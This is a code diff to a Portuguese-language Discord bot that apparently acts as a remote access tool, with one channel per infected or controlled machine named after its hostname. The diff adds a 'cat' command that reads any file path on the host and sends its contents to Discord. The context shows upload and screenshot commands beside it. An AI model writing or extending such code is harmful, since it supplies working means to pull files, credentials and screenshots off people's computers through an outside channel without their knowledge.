@@ -13,7 +13,7 @@ import json
 
 TOKEN = "TOKEN"
 GUILD_ID = 1343592669338665038  # ID do servidor
-CHANNEL_NAME = "🌐｜dashboard"
+CHANNEL_NAME = "dashboard"
 ENCODING = "cp850" 
 
 intents = discord.Intents.default()
@@ -220,6 +220,34 @@ async def upload(interaction: discord.Interaction, ficheiro: discord.Attachment,
             await interaction.followup.send(f"❌ Erro ao guardar o ficheiro: `{e}`")
     else:
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
+
+
+@bot.tree.command(name="cat", description="Lê o conteúdo de um ficheiro na máquina.")
+async def cat(interaction: discord.Interaction, path: str):
+    if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
+        normal_activity()
+
+        if not os.path.exists(path):
+            await interaction.followup.send("❌ Caminho inválido ou ficheiro não encontrado.")
+            return
+        try:
+            with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                content = f.read()
+            if len(content) < 1800:
+                await interaction.followup.send(f"📄 Conteúdo do ficheiro:\n```{content}```")
+            else:
+                temp_path = "cat_output.txt"
+                with open(temp_path, "w", encoding="utf-8") as f:
+                    f.write(content)
+
+                await interaction.followup.send("📄 Conteúdo demasiado extenso:", file=discord.File(temp_path))
+                os.remove(temp_path)
+
+        except Exception as e:
+            await interaction.followup.send(f"❌ Erro ao ler o ficheiro: {e}")
+    else:
+        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!",ephemeral=True)
 
 
 @bot.tree.command(name="scrn", description="Captura uma screenshot")
